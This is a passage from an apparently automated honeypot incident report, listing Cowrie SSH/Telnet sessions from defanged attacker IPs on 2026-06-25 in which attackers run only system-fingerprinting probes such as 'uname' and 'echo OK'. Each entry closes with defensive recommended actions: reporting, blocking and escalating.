| `2026-06-25 15:07:40` | `cowrie.command.input` |
| `2026-06-25 15:07:40` | `cowrie.log.closed` |
| `2026-06-25 15:07:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f0b808f1d404

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 15:08 |
| **Last Seen** | 2026-06-25 15:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 15:08:31` | `cowrie.session.connect` |
| `2026-06-25 15:08:31` | `cowrie.client.version` |
| `2026-06-25 15:08:31` | `cowrie.client.kex` |
| `2026-06-25 15:08:32` | `cowrie.login.success` |
| `2026-06-25 15:08:33` | `cowrie.session.params` |
| `2026-06-25 15:08:33` | `cowrie.command.input` |
| `2026-06-25 15:08:33` | `cowrie.log.closed` |
| `2026-06-25 15:08:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2957e0a680b6

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 15:09 |
| **Last Seen** | 2026-06-25 15:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 15:09:26` | `cowrie.session.connect` |
| `2026-06-25 15:09:26` | `cowrie.client.version` |
| `2026-06-25 15:09:26` | `cowrie.client.kex` |
| `2026-06-25 15:09:26` | `cowrie.login.success` |
| `2026-06-25 15:09:27` | `cowrie.session.params` |
| `2026-06-25 15:09:27` | `cowrie.command.input` |
| `2026-06-25 15:09:27` | `cowrie.log.closed` |
| `2026-06-25 15:09:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-52e9ff175759

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 15:10 |
| **Last Seen** | 2026-06-25 15:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 15:10:24` | `cowrie.session.connect` |
| `2026-06-25 15:10:24` | `cowrie.client.version` |
| `2026-06-25 15:10:24` | `cowrie.client.kex` |
| `2026-06-25 15:10:24` | `cowrie.login.success` |
| `2026-06-25 15:10:25` | `cowrie.session.params` |
| `2026-06-25 15:10:25` | `cowrie.command.input` |
| `2026-06-25 15:10:25` | `cowrie.log.closed` |
| `2026-06-25 15:10:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8bd6db2c130b

| Field | Detail |
|---|---|
| **Source IP** | `218.27.202[.]178` |
| **First Seen** | 2026-06-25 15:10 |
| **Last Seen** | 2026-06-25 15:10 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 15:10:31` | `cowrie.session.connect` |
| `2026-06-25 15:10:31` | `cowrie.client.version` |
| `2026-06-25 15:10:31` | `cowrie.client.kex` |
| `2026-06-25 15:10:35` | `cowrie.login.success` |
| `2026-06-25 15:10:37` | `cowrie.session.params` |
| `2026-06-25 15:10:37` | `cowrie.command.input` |
| `2026-06-25 15:10:38` | `cowrie.log.closed` |
| `2026-06-25 15:10:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.27.202[.]178` to AbuseIPDB if not already reported
- [ ] Block `218.27.202[.]178` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ca44d3165f9e

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 15:11 |
| **Last Seen** | 2026-06-25 15:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 15:11:27` | `cowrie.session.connect` |
| `2026-06-25 15:11:27` | `cowrie.client.version` |
| `2026-06-25 15:11:27` | `cowrie.client.kex` |
| `2026-06-25 15:11:27` | `cowrie.login.success` |
| `2026-06-25 15:11:28` | `cowrie.session.params` |
| `2026-06-25 15:11:28` | `cowrie.command.input` |
| `2026-06-25 15:11:28` | `cowrie.log.closed` |
| `2026-06-25 15:11:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-30cae7e86654

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 15:12 |
| **Last Seen** | 2026-06-25 15:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 15:12:26` | `cowrie.session.connect` |
| `2026-06-25 15:12:26` | `cowrie.client.version` |
| `2026-06-25 15:12:27` | `cowrie.client.kex` |
| `2026-06-25 15:12:27` | `cowrie.login.success` |
| `2026-06-25 15:12:28` | `cowrie.session.params` |
| `2026-06-25 15:12:28` | `cowrie.command.input` |
| `2026-06-25 15:12:28` | `cowrie.log.closed` |
| `2026-06-25 15:12:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8c7c4985b82d

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 15:13 |
| **Last Seen** | 2026-06-25 15:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 15:13:25` | `cowrie.session.connect` |
| `2026-06-25 15:13:25` | `cowrie.client.version` |
| `2026-06-25 15:13:25` | `cowrie.client.kex` |
| `2026-06-25 15:13:26` | `cowrie.login.success` |
| `2026-06-25 15:13:26` | `cowrie.session.params` |
| `2026-06-25 15:13:26` | `cowrie.command.input` |
| `2026-06-25 15:13:27` | `cowrie.log.closed` |
| `2026-06-25 15:13:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b31e5df164f8

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 15:14 |
| **Last Seen** | 2026-06-25 15:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 15:14:19` | `cowrie.session.connect` |
| `2026-06-25 15:14:19` | `cowrie.client.version` |
| `2026-06-25 15:14:19` | `cowrie.client.kex` |
| `2026-06-25 15:14:19` | `cowrie.login.success` |
| `2026-06-25 15:14:20` | `cowrie.session.params` |
| `2026-06-25 15:14:20` | `cowrie.command.input` |
| `2026-06-25 15:14:20` | `cowrie.log.closed` |
| `2026-06-25 15:14:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c432cbb923ca

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 15:15 |
| **Last Seen** | 2026-06-25 15:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 15:15:14` | `cowrie.session.connect` |
| `2026-06-25 15:15:14` | `cowrie.client.version` |
| `2026-06-25 15:15:14` | `cowrie.client.kex` |
| `2026-06-25 15:15:15` | `cowrie.login.success` |
| `2026-06-25 15:15:16` | `cowrie.session.params` |
| `2026-06-25 15:15:16` | `cowrie.command.input` |
| `2026-06-25 15:15:16` | `cowrie.log.closed` |
| `2026-06-25 15:15:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-72d1ac009621

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 15:16 |
| **Last Seen** | 2026-06-25 15:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 15:16:11` | `cowrie.session.connect` |
| `2026-06-25 15:16:11` | `cowrie.client.version` |
| `2026-06-25 15:16:11` | `cowrie.client.kex` |
| `2026-06-25 15:16:12` | `cowrie.login.success` |
| `2026-06-25 15:16:12` | `cowrie.session.params` |
| `2026-06-25 15:16:12` | `cowrie.command.input` |
| `2026-06-25 15:16:13` | `cowrie.log.closed` |
| `2026-06-25 15:16:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ef9371cda54a

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 15:17 |
| **Last Seen** | 2026-06-25 15:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 15:17:13` | `cowrie.session.connect` |
| `2026-06-25 15:17:13` | `cowrie.client.version` |
| `2026-06-25 15:17:13` | `cowrie.client.kex` |
| `2026-06-25 15:17:14` | `cowrie.login.success` |
| `2026-06-25 15:17:14` | `cowrie.session.params` |
| `2026-06-25 15:17:14` | `cowrie.command.input` |
| `2026-06-25 15:17:15` | `cowrie.log.closed` |
| `2026-06-25 15:17:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-12a5bb3bb15e

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 15:18 |
| **Last Seen** | 2026-06-25 15:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 15:18:12` | `cowrie.session.connect` |
| `2026-06-25 15:18:12` | `cowrie.client.version` |
| `2026-06-25 15:18:12` | `cowrie.client.kex` |
| `2026-06-25 15:18:12` | `cowrie.login.success` |
| `2026-06-25 15:18:13` | `cowrie.session.params` |
| `2026-06-25 15:18:13` | `cowrie.command.input` |
| `2026-06-25 15:18:13` | `cowrie.log.closed` |
| `2026-06-25 15:18:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7bb8c78a8f61

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 15:19 |
| **Last Seen** | 2026-06-25 15:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 15:19:12` | `cowrie.session.connect` |
| `2026-06-25 15:19:12` | `cowrie.client.version` |
| `2026-06-25 15:19:12` | `cowrie.client.kex` |
| `2026-06-25 15:19:12` | `cowrie.login.success` |
| `2026-06-25 15:19:13` | `cowrie.session.params` |
| `2026-06-25 15:19:13` | `cowrie.command.input` |
| `2026-06-25 15:19:13` | `cowrie.log.closed` |
| `2026-06-25 15:19:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1d3194c97d6c

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 15:20 |
| **Last Seen** | 2026-06-25 15:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 15:20:09` | `cowrie.session.connect` |
| `2026-06-25 15:20:09` | `cowrie.client.version` |
| `2026-06-25 15:20:10` | `cowrie.client.kex` |
| `2026-06-25 15:20:10` | `cowrie.login.success` |
| `2026-06-25 15:20:11` | `cowrie.session.params` |
| `2026-06-25 15:20:11` | `cowrie.command.input` |
| `2026-06-25 15:20:11` | `cowrie.log.closed` |
| `2026-06-25 15:20:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ae30cf16c4da

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 15:21 |
| **Last Seen** | 2026-06-25 15:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 15:21:05` | `cowrie.session.connect` |
| `2026-06-25 15:21:05` | `cowrie.client.version` |
| `2026-06-25 15:21:05` | `cowrie.client.kex` |
| `2026-06-25 15:21:05` | `cowrie.login.success` |
| `2026-06-25 15:21:06` | `cowrie.session.params` |
| `2026-06-25 15:21:06` | `cowrie.command.input` |
| `2026-06-25 15:21:06` | `cowrie.log.closed` |
| `2026-06-25 15:21:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7b1f4908792f

| Field | Detail |
|---|---|
| **Source IP** | `167.172.152[.]94` |
| **First Seen** | 2026-06-25 15:21 |
| **Last Seen** | 2026-06-25 15:22 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 15:21:06` | `cowrie.session.connect` |
| `2026-06-25 15:21:06` | `cowrie.telnet.option` |
| `2026-06-25 15:21:06` | `cowrie.telnet.option` |
| `2026-06-25 15:22:06` | `cowrie.login.success` |
| `2026-06-25 15:22:07` | `cowrie.session.params` |

**Recommended Actions:**
- [ ] Submit `167.172.152[.]94` to AbuseIPDB if not already reported
- [ ] Block `167.172.152[.]94` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d62a95206456

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 15:22 |
| **Last Seen** | 2026-06-25 15:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 15:22:01` | `cowrie.session.connect` |
| `2026-06-25 15:22:01` | `cowrie.client.version` |
| `2026-06-25 15:22:01` | `cowrie.client.kex` |
| `2026-06-25 15:22:02` | `cowrie.login.success` |
| `2026-06-25 15:22:03` | `cowrie.session.params` |
| `2026-06-25 15:22:03` | `cowrie.command.input` |
| `2026-06-25 15:22:03` | `cowrie.log.closed` |
| `2026-06-25 15:22:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-577d31918a08

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 15:23 |
| **Last Seen** | 2026-06-25 15:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 15:23:01` | `cowrie.session.connect` |
| `2026-06-25 15:23:01` | `cowrie.client.version` |
| `2026-06-25 15:23:01` | `cowrie.client.kex` |
| `2026-06-25 15:23:01` | `cowrie.login.success` |
| `2026-06-25 15:23:02` | `cowrie.session.params` |
| `2026-06-25 15:23:02` | `cowrie.command.input` |
| `2026-06-25 15:23:02` | `cowrie.log.closed` |
| `2026-06-25 15:23:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-89dca7019a3f

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 15:24 |
| **Last Seen** | 2026-06-25 15:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 15:24:03` | `cowrie.session.connect` |
| `2026-06-25 15:24:03` | `cowrie.client.version` |
| `2026-06-25 15:24:03` | `cowrie.client.kex` |
| `2026-06-25 15:24:03` | `cowrie.login.success` |
| `2026-06-25 15:24:04` | `cowrie.session.params` |
| `2026-06-25 15:24:04` | `cowrie.command.input` |
| `2026-06-25 15:24:04` | `cowrie.log.closed` |
| `2026-06-25 15:24:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9ea72c9aa5a5

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-06-25 15:25 |
| **Last Seen** | 2026-06-25 15:25 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 15:25:00` | `cowrie.session.connect` |
| `2026-06-25 15:25:01` | `cowrie.client.version` |
| `2026-06-25 15:25:01` | `cowrie.client.kex` |
| `2026-06-25 15:25:08` | `cowrie.login.success` |
| `2026-06-25 15:25:12` | `cowrie.session.params` |
| `2026-06-25 15:25:12` | `cowrie.command.input` |
| `2026-06-25 15:25:13` | `cowrie.log.closed` |
| `2026-06-25 15:25:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5ef38a31fb59

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 15:25 |
| **Last Seen** | 2026-06-25 15:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 15:25:02` | `cowrie.session.connect` |
| `2026-06-25 15:25:02` | `cowrie.client.version` |
| `2026-06-25 15:25:02` | `cowrie.client.kex` |
| `2026-06-25 15:25:02` | `cowrie.login.success` |
| `2026-06-25 15:25:03` | `cowrie.session.params` |
| `2026-06-25 15:25:03` | `cowrie.command.input` |
| `2026-06-25 15:25:03` | `cowrie.log.closed` |
| `2026-06-25 15:25:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-26279e8ed5e3

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 15:26 |
| **Last Seen** | 2026-06-25 15:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 15:26:01` | `cowrie.session.connect` |
| `2026-06-25 15:26:01` | `cowrie.client.version` |
| `2026-06-25 15:26:01` | `cowrie.client.kex` |
| `2026-06-25 15:26:02` | `cowrie.login.success` |
| `2026-06-25 15:26:03` | `cowrie.session.params` |
| `2026-06-25 15:26:03` | `cowrie.command.input` |
| `2026-06-25 15:26:03` | `cowrie.log.closed` |
| `2026-06-25 15:26:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-89587db5207e

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-06-25 15:26 |
| **Last Seen** | 2026-06-25 15:26 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 15:26:27` | `cowrie.session.connect` |
| `2026-06-25 15:26:27` | `cowrie.client.version` |
| `2026-06-25 15:26:27` | `cowrie.client.kex` |
| `2026-06-25 15:26:29` | `cowrie.login.success` |
| `2026-06-25 15:26:30` | `cowrie.session.params` |
| `2026-06-25 15:26:30` | `cowrie.command.input` |
| `2026-06-25 15:26:31` | `cowrie.log.closed` |
| `2026-06-25 15:26:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e51776230a48

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 15:26 |
| **Last Seen** | 2026-06-25 15:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 15:26:59` | `cowrie.session.connect` |
| `2026-06-25 15:26:59` | `cowrie.client.version` |
| `2026-06-25 15:26:59` | `cowrie.client.kex` |
| `2026-06-25 15:26:59` | `cowrie.login.success` |
| `2026-06-25 15:27:00` | `cowrie.session.params` |
| `2026-06-25 15:27:00` | `cowrie.command.input` |
| `2026-06-25 15:27:00` | `cowrie.log.closed` |
| `2026-06-25 15:27:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3d3f4ace3d4e

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 15:27 |
| **Last Seen** | 2026-06-25 15:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 15:27:59` | `cowrie.session.connect` |
| `2026-06-25 15:27:59` | `cowrie.client.version` |
| `2026-06-25 15:27:59` | `cowrie.client.kex` |
| `2026-06-25 15:27:59` | `cowrie.login.success` |
| `2026-06-25 15:28:00` | `cowrie.session.params` |
| `2026-06-25 15:28:00` | `cowrie.command.input` |
| `2026-06-25 15:28:00` | `cowrie.log.closed` |
| `2026-06-25 15:28:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-129fd598bfcf

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 15:28 |
| **Last Seen** | 2026-06-25 15:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 15:28:59` | `cowrie.session.connect` |
| `2026-06-25 15:28:59` | `cowrie.client.version` |
| `2026-06-25 15:28:59` | `cowrie.client.kex` |
